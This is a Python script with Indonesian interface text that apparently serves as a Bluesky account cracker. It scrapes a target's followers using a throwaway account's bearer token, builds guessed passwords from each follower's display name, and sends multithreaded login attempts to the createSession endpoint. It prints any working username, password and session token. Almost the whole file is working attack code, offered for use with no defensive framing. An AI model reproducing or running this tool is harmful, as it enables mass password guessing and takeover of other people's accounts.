
import requests, re, os, time, random, json, base64
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from bs4 import BeautifulSoup

H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
N = '\x1b[0m'	 # WARNA MATI
M = "\x1b[0;31m" # Merah

class Main:
	def __init__(jar):
		jar.success, jar.dump, jar.looping = [],[],0
	
	def login(jar):
		try:
			bearer = input(" > Masukkan bearer token  Anda (gunakan akun tumbal): ")
			token = jar.parse_tokenb(bearer)
			if not token:
				print(f' > Login bearer token Gagal Cobalagi..!!!')
				exit()
			
			if not os.path.exists('Data'):
				os.makedirs('Data')
			
			bearer_data = {'Bearer': bearer}
			with open('Data/Tokenb.json', 'w') as file:
				json.dump(bearer_data, file)
			
			jar.menu()
		except (Exception, AttributeError, ValueError) as e:
			print(e)
	
	def parse_tokenb(jar, token):
		try:
			tok = token.replace("Bearer ", "")
			header, payload, signature = tok.split('.')
			header_decode = base64.urlsafe_b64decode(header + '==').decode()
			payload_decode = base64.urlsafe_b64decode(payload + '==').decode()
			header_json = json.loads(header_decode)
			payload_json = json.loads(payload_decode)
			did = payload_json.get('sub')
			params = {'actor': did}
			headers = {
				'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
				'authorization': token,
				'origin': "https://bsky.app",
				'sec-fetch-site': "cross-site",
				'sec-fetch-mode': "cors",
				'sec-fetch-dest': "empty",
				'referer': "https://bsky.app/",
				'accept-language': "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			}
			response = requests.get("https://chaga.us-west.host.bsky.network/xrpc/app.bsky.actor.getProfile", params=params, headers=headers)
			if response.status_code == 200:
				data = response.json()
				followers = data.get("followersCount")
				username = data.get("handle")
				return {
					'nama': username,
					'followers': followers
				}
		except (Exception, AttributeError, ValueError) as e:
			if os.path.exists('Data/Tokenb.json'):
				os.remove('Data/Tokenb.json')
			return {'nama': None,'followers': None}
	
	def load_tokenb(jar):
		try:
			with open("Data/Tokenb.json", "r") as file:
				data = json.load(file)
				return data.get("Bearer", "")
		except (FileNotFoundError, json.JSONDecodeError):
			return None
		
	def menu(jar):
		os.system('cls' if os.name == 'nt' else 'clear')
		token = jar.load_tokenb()
		if not token:
			print(" > Bearer token tidak ditemukan, silakan login.")
			jar.login()
			return
		
		profil = jar.parse_tokenb(token)
		if profil is False or profil['nama'] is None:
			print(" > Bearer token tidak valid, silakan login kembali.")
			jar.login()
			return 
			
		print(f"""\n > Profil: {profil['nama']}|{profil['followers']}
 1. dump followers
 2. dump following
 3. start crack
 4. exit
		""")
		
		pilih = input(" > pilih: ")
		if pilih == '1':
			jar.followers(token)
	
	def get_meta_content(jar, username, meta_name):
		response = requests.get(f'https://bsky.app/profile/{username}')
		soup = BeautifulSoup(response.text, 'html.parser')
		return soup.find('meta', {'name': meta_name}).get('content', None)
		
	def followers(jar, token):
		username = input(f" > Masukkan username target: ")
		try:
			did = jar.get_meta_content(username, 'twitter:value1')
			if did:
				print(f" > Dumps untuk {username}", end = '\r')
				jar.loop_dump_follow(did, token, '')
			else:
				print(f" > Tag meta tidak ditemukan untuk {username}")
		except:pass
		jar.crack()
	
	def loop_dump_follow(jar, uid, token, cursor=None):
		try:
			headers = {
				'authority': 'chaga.us-west.host.bsky.network',
				'accept': '*/*',
				'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
				'authorization': token,
				'origin': 'https://bsky.app',
				'referer': 'https://bsky.app/',
				'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
			}
			params = {'actor': uid,'limit': "30",'cursor': cursor}
			response = requests.get('https://chaga.us-west.host.bsky.network/xrpc/app.bsky.graph.getFollowers', params=params, headers=headers).json()
			for follower in response.get("followers", []):
				handle = follower.get('handle', 'unknown')
				display_name = follower.get('displayName', 'unknown')
				entri_pengikut = f"{handle}|{display_name}"
				if entri_pengikut not in jar.dump:
					jar.dump.append(entri_pengikut)
					print(f' > Sedang dumps {handle[:15]} / {len(jar.dump)}{"  "*8}', end='\r')
			if 'cursor' in response:
				jar.loop_dump_follow(uid, token, response["cursor"])
		except:pass
	
	def generate_password(jar, name):
		password, passwords = [],[]
		for nama in name.split(' '):
			if len(nama) < 3:
				continue
			elif len(nama) == 3 or len(nama) == 4 or len(nama) == 5:
				nm = nama.lower()
				password.append(nm + '123')
				password.append(nm + '1234')
				password.append(nm + '12345')
			else:
				nm = nama.lower()
				password.append(nm + '123')
				password.append(nm + '1234')
				password.append(nm + '12345')
			if len(name) <5:pass
			else:
				password.append(name.replace(' ','').lower())
				password.append(name.lower())
		for g in password:
			if g not in passwords:
				if len(g) <=5:pass
				else:passwords.append(g)
		return passwords
	
	def crack(jar):
		with ThreadPoolExecutor(max_workers=35) as Z:
			for data in jar.dump:
				try:
					apalah = data.split('|')
					if len(apalah) < 2:
						username, name = apalah[0], apalah[1]
				except:pass
				pwd = jar.generate_password(name)
				Z.submit(jar.startcrack, username, pwd)
		exit()
	
	def cek_profile_user(jar, uid):
		try:
			headers = {"host": "public.api.bsky.app", "sec-ch-ua": '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"', "sec-ch-ua-mobile": "?0", "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36", "atproto-accept-labelers": "did:plc:ar7c4by46qjdydhdevvrndac;redact", "sec-ch-ua-platform": '"Linux"', "accept": "*/*", "origin": "https://bsky.app", "sec-fetch-site": "same-site", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://bsky.app/", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "priority": "u=1, i"}
			response = requests.get("https://public.api.bsky.app/xrpc/app.bsky.actor.getProfile", params={'actor': uid}, headers=headers)
			data = response.json()
			followers_count = data.get("followersCount")
			follows_count = data.get("followsCount")
			posts_count = data.get("postsCount")
			return followers_count, follows_count, posts_count
		except (requests.exceptions.ConnectionError, Exception):
			return None, None, None
		
	def startcrack(jar, username, password):
		for pw in password:
			try:
				r = requests.Session()
				payload = {"identifier": username,"password": pw,"authFactorToken": "","allowTakendown":True}
				r.headers.update({'host': 'bsky.social','content-length': str(len(("&").join([ "%s=%s" % (x, y) for x, y in payload.items()]))),'sec-ch-ua-platform': '"Android"','user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36','sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"','content-type': 'application/json','sec-ch-ua-mobile': '?1','accept': '*/*','origin': 'https://bsky.app','sec-fetch-site': 'cross-site','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://bsky.app/','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
				print(r.headers)
				response = r.post("https://bsky.social/xrpc/com.atproto.server.createSession", data=json.dumps(payload))
				if 'refreshJwt' in str(response.json()) and 'did' in str(response.json()):
					refreshJwt = response.json().get('refreshJwt')
					Authorization = f"Bearer {refreshJwt}"
					did = response.json().get('did')
					followers_count, follows_count, posts_count = jar.cek_profile_user(did)
					print(f"""
 > Username: {username}
 > Password: {pw}
 > Profile: {followers_count}|{follows_count}|{posts_count}
 > Bearer: {Authorization}
					""")
					jar.success.append(username+'|'+pw)
					break
				else:continue
			except (requests.exceptions.ConnectionError):
				time.sleep(15)
		print(f' > Progress {jar.looping}|{len(jar.dump)} > Log-in: {len(jar.success)}{" "*15}', end = '\r')
		jar.looping += 1
		
Main().menu()